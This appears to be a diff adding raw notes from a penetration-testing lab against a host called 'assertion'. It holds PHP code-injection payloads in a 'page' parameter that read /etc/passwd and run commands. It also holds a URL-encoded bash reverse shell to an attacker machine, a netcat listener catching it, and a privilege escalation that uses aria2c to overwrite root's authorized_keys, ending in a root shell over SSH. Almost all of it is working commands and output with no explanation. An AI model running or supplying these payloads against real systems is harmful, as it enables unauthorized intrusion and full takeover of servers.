@@ -1,0 +1,128 @@
+
+
+
+
+
+
+http://192.168.201.94/index.php?page=%27%20and%20die(show_source(%27/etc/passwd%27))%20or%20%27
+
+
+?page=' and die(system('id')) or '
+?page=' and die(shell_exec('whoami')) or '
+?page=' and die(passthru('ls /')) or '
+
+
+http://192.168.201.94/index.php?page=%27%20and%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.45.210/443%200%3E%261%22%27)%20or%20%27
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.201.94] 53292
+bash: cannot set terminal process group (1077): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@assertion:/var/www/html$ 
+www-data@assertion:/var/www$ find / -perm -g=s -type f 2>/dev/null
+/sbin/pam_extrausers_chkpwd
+/sbin/unix_chkpwd
+/usr/lib/snapd/snap-confine
+/usr/lib/emacs/25.2/x86_64-linux-gnu/movemail
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/bin/at
+/usr/bin/aria2c
+/usr/bin/wall
+/usr/bin/chage
+/usr/bin/bsd-write
+/usr/bin/mlocate
+/usr/bin/ssh-agent
+/usr/bin/expiry
+/usr/bin/crontab
+/usr/bin/dotlockfile
+/snap/core/9804/sbin/pam_extrausers_chkpwd
+/snap/core/9804/sbin/unix_chkpwd
+/snap/core/9804/usr/bin/chage
+/snap/core/9804/usr/bin/crontab
+/snap/core/9804/usr/bin/dotlockfile
+/snap/core/9804/usr/bin/expiry
+/snap/core/9804/usr/bin/mail-lock
+/snap/core/9804/usr/bin/mail-touchlock
+/snap/core/9804/usr/bin/mail-unlock
+/snap/core/9804/usr/bin/ssh-agent
+/snap/core/9804/usr/bin/wall
+/snap/core/8268/sbin/pam_extrausers_chkpwd
+/snap/core/8268/sbin/unix_chkpwd
+/snap/core/8268/usr/bin/chage
+/snap/core/8268/usr/bin/crontab
+/snap/core/8268/usr/bin/dotlockfile
+/snap/core/8268/usr/bin/expiry
+/snap/core/8268/usr/bin/mail-lock
+/snap/core/8268/usr/bin/mail-touchlock
+/snap/core/8268/usr/bin/mail-unlock
+/snap/core/8268/usr/bin/ssh-agent
+/snap/core/8268/usr/bin/wall
+/snap/core/8268/usr/lib/snapd/snap-confine
+www-data@assertion:/var/www$
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -f /tmp/id_rsa
+Generating public/private ed25519 key pair.
+Enter passphrase for "/tmp/id_rsa" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /tmp/id_rsa
+Your public key has been saved in /tmp/id_rsa.pub
+The key fingerprint is:
+SHA256:nCu4fLoFATVXfNC9xcZ6ZadFWQg6a+jFUrLIlHBOSHI root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|  ooE.+ooo ..+ o=|
+|   +.B .. o.. *.=|
+|    . + ..+  = =.|
+|     + o B oo o  |
+|    . o S =  .   |
+|     o . =       |
+|    . o o        |
+|   . o..         |
+|    =+           |
++----[SHA256]-----+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+──(root㉿kali)-[/tmp]
+└─# cat id_rsa.pub          
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAV6DvHyAazcu3DIwNir8HDeV6mqB1MSNN67YGvJy5TT root@kali
+                                                            
+┌──(root㉿kali)-[/tmp]
+└─# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAV6DvHyAazcu3DIwNir8HDeV6mqB1MSNN67YGvJy5TT root@kali' > key
+                                              
+┌──(root㉿kali)-[/tmp]
+└─# python3 -m http.server 80 --directory /tmp/                                                            
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.117.94 - - [03/Oct/2025 06:58:39] "GET /key HTTP/1.1" 200 -
+
+
+
+
+www-data@assertion:/tmp$ /usr/bin/aria2c --allow-overwrite=true --dir=/root/.ssh --out=authorized_keys http://192.168.45.210:80/key
+
+10/03 10:58:53 [NOTICE] Downloading 1 item(s)
+
+10/03 10:58:53 [NOTICE] Download complete: /root/.ssh/authorized_keys
+
+Download Results:
+gid   |stat|avg speed  |path/URI
+======+====+===========+=======================================================
+92f181|OK  |    88KiB/s|/root/.ssh/authorized_keys
+
+Status Legend:
+(OK):download completed.
+www-data@assertion:/tmp$ 
+
+
+
+
+┌──(root㉿kali)-[/tmp]
+└─# ssh -i id_rsa root@192.168.117.94 
+...
+
+root@assertion:~# 
